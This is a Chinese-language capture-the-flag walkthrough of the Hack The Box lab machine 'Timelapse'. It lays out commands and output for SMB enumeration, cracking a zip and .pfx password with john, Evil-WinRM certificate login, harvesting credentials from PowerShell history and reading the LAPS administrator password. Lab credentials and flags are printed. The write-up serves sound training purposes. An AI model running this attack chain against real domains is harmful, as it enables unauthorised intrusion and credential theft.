kali 10.10.16.5

靶机 10.10.11.152

[HTB: Timelapse | 0xdf hacks stuff](https://0xdf.gitlab.io/2022/08/20/htb-timelapse.html#shell-as-root)



```bash
└─# nmap -p- -sT  10.10.11.152 -oN ports.txt
└─# cat ports.txt | grep '/' | awk -F '/' '{print $1}' | paste -sd
```

```bash
└─# nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49696,62656 -sCV 10.10.11.152
```

```
PORT      STATE    SERVICE           VERSION
53/tcp    open     domain            Simple DNS Plus
88/tcp    open     kerberos-sec      Microsoft Windows Kerberos (server time: 2023-09-12 16:31:18Z)
135/tcp   open     msrpc             Microsoft Windows RPC
139/tcp   open     netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open     ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ldapssl?
3268/tcp  open     ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open     globalcatLDAPssl?
5986/tcp  open     ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2023-09-12T16:33:01+00:00; +7h59m59s from scanner time.
9389/tcp  open     mc-nmf            .NET Message Framing
49667/tcp open     msrpc             Microsoft Windows RPC
49673/tcp open     ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open     msrpc             Microsoft Windows RPC
49696/tcp filtered unknown
62656/tcp filtered unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-09-12T16:32:22
|_  start_date: N/A
```



一眼域控，绑定 hosts

```bash
└─# echo "10.10.11.152 timelapse.htb dc01.timelapse.htb" >> /etc/hosts
```



# 445：

```bash
└─# crackmapexec smb dc01.timelapse.htb 
[*] Initializing FTP protocol database
SMB         timelapse.htb   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
```

```
└─# smbclient -L //dc01.timelapse.htb -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
```



递归列出所有文件

```bash
└─# smbmap -H dc01.timelapse.htb -u guest -R 
[+] IP: dc01.timelapse.htb:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	.\IPC$\*
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	InitShutdown
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	lsass
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ntsvcs
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	scerpc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-394-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	epmapper
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-1f4-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	LSM_API_service
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	eventlog
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-480-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	atsvc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-5c8-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-290-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-290-1
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	wkssvc
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	RpcProxy\49673
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	261d6dc7218484b5
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	RpcProxy\593
	fr--r--r--                5 Sun Dec 31 19:03:58 1600	srvsvc
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	netdfs
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	vgauth-service
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	tapsrv
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	W32TIME_ALT
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-278-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ROUTER
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-b08-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-ad8-0
	NETLOGON                                          	NO ACCESS	Logon server share 
	Shares                                            	READ ONLY	
	.\Shares\*
	dr--r--r--                0 Mon Oct 25 11:55:14 2021	.
	dr--r--r--                0 Mon Oct 25 11:55:14 2021	..
	dr--r--r--                0 Mon Oct 25 15:40:06 2021	Dev
	dr--r--r--                0 Mon Oct 25 11:55:14 2021	HelpDesk
	.\Shares\Dev\*
	dr--r--r--                0 Mon Oct 25 15:40:06 2021	.
	dr--r--r--                0 Mon Oct 25 15:40:06 2021	..
	fr--r--r--             2611 Mon Oct 25 17:05:30 2021	winrm_backup.zip
	.\Shares\HelpDesk\*
	dr--r--r--                0 Mon Oct 25 11:55:14 2021	.
	dr--r--r--                0 Mon Oct 25 11:55:14 2021	..
	fr--r--r--          1118208 Mon Oct 25 11:55:14 2021	LAPS.x64.msi
	fr--r--r--           104422 Mon Oct 25 11:55:14 2021	LAPS_Datasheet.docx
	fr--r--r--           641378 Mon Oct 25 11:55:14 2021	LAPS_OperationsGuide.docx
	fr--r--r--            72683 Mon Oct 25 11:55:14 2021	LAPS_TechnicalSpecification.docx
	SYSVOL                                            	NO ACCESS	Logon server share 
```



```bash
└─# smbclient  //dc01.timelapse.htb/shares -N                                                                                                                 1 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

		6367231 blocks of size 4096. 1273156 blocks available
smb: \> cd dev
smb: \dev\> ls
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

		6367231 blocks of size 4096. 1263235 blocks available
smb: \dev\> get winrm_backup.zip
getting file \dev\winrm_backup.zip of size 2611 as winrm_backup.zip (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \dev\> exit
```



# winrm_backup.zip：

这个文件原远程管理信息的备份文件

```bash
─# unzip -l winrm_backup.zip
Archive:  winrm_backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     2555  2021-10-25 10:21   legacyy_dev_auth.pfx
---------                     -------
     2555                     1 file
```

需要密码解压，尝试爆破

```bash
└─# zip2john winrm_backup.zip > winrm_backup.zip.hash
└─# john  --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.zip.hash 
```

得到密码   `supremelegacy` 

解压 得到  `legacyy_dev_auth.pfx` 文件

```bash
└─# unzip winrm_backup.zip   
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
password incorrect--reenter: 
  inflating: legacyy_dev_auth.pfx    
```



# legacyy_dev_auth.pfx

不知道 `.pfx` 后缀的文件是干啥的，这个得现场搜索，现学现卖

<img src=".\图片\Snipaste_2023-09-12_16-45-02.png" alt="Snipaste_2023-09-12_16-45-02" style="zoom:80%;" />

大约是解密后可以得到，什么 公钥证书 的

于是再搜索 `.pfx`  、`certificate and keys` 这类词语，得到文章 [Extracting the certificate and keys from a .pfx file - IBM Documentation](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file)

于是跟随文章操作

又需要密码

```bash
└─# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
Enter Import Password:
Mac verify error: invalid password?
```

继续转化为中间文件 john 破解，得到密码 `thuglegacy`

```
└─# pfx2john legacyy_dev_auth.pfx | tee legacyy_dev_auth.pfx.hash
```

```
thuglegacy       (legacyy_dev_auth.pfx) 
```

导出  密钥 文件

```bash
└─# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
Enter Import Password:
Enter PEM pass phrase:    123456
Verifying - Enter PEM pass phrase:  123456
```

```bash
└─# openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
Enter pass phrase for legacyy_dev_auth.key-enc:  123456
writing RSA key
```

```bash
└─# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password:
```

```bash
└─# cat legacyy_dev_auth.crt            
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN = Legacyy
issuer=CN = Legacyy
-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----
```

看似类似 linux 里的 密钥，可能有与 linux 类似的登录方法

# Evil-WinRM

```bash
└─# evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
                                        
Evil-WinRM shell v3.5 
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine 
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
                                        
Warning: SSL enabled 
                                        
Info: Establishing connection to remote endpoint 
*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

```powershell
*Evil-WinRM* PS C:\Users\legacyy\desktop> cat user.txt
5294d49beb768f3fade34c1da8d5886d
```



# 提权横向

二次信息收集

```powershell
cat user.*Evil-WinRM* PS C:\Users\legacyy\desktop> cat user.txt
5294d49beb768f3fade34c1da8d5886d
*Evil-WinRM* PS C:\Users\legacyy\desktop> net user legacyy
User name                    legacyy
Full Name                    Legacyy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/23/2021 12:17:10 PM
Password expires             Never
Password changeable          10/24/2021 12:17:10 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/12/2023 10:01:23 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Development
The command completed successfully.
```

```powershell
*Evil-WinRM* PS C:\Users\legacyy\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

找 PowerShell History

```powershell
*Evil-WinRM* PS C:\Users\legacyy\desktop> cd C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
```

```powershell
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

得到一组账号密码

```
svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
```

再 登录

```
evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```



三次信息收集

```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

发现它的组在 `LAPS_Readers`

那么读取 `LAPS_Readers` 即可

这样读

```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```

```
DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : !r(EG#m;wv0Y@-VTMtOc.]$V
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```

得到 `administrator` 的密码 `!r(EG#m;wv0Y@-VTMtOc.]$V`

登录即可

```powershell
└─# evil-winrm -i timelapse.htb -S -u administrator -p '!r(EG#m;wv0Y@-VTMtOc.]$V'
*Evil-WinRM* PS C:\Users\trx\desktop> cat root.txt
61a4bfb5bde7e69b6d5590faf2d66ca5
```



补充尝试读取 laps

```bash
└─# crackmapexec smb 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --laps --ntds                                                                  49 ⨯
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [-] DC01\administrator:!r(EG#m;wv0Y@-VTMtOc.]$V STATUS_LOGON_FAILURE 
```

```bash
└─# ldapsearch -H ldap://10.10.11.152 -b 'DC=timelapse,DC=htb' -x -D svc_deploy@timelapse.htb -w 'E3R$Q62^12p7PLlC%KWaxuaV' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base <DC=timelapse,DC=htb> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# DC01, Domain Controllers, timelapse.htb
dn: CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
ms-Mcs-AdmPwd: !r(EG#m;wv0Y@-VTMtOc.]$V

# search reference
ref: ldap://ForestDnsZones.timelapse.htb/DC=ForestDnsZones,DC=timelapse,DC=htb

# search reference
ref: ldap://DomainDnsZones.timelapse.htb/DC=DomainDnsZones,DC=timelapse,DC=htb

# search reference
ref: ldap://timelapse.htb/CN=Configuration,DC=timelapse,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```


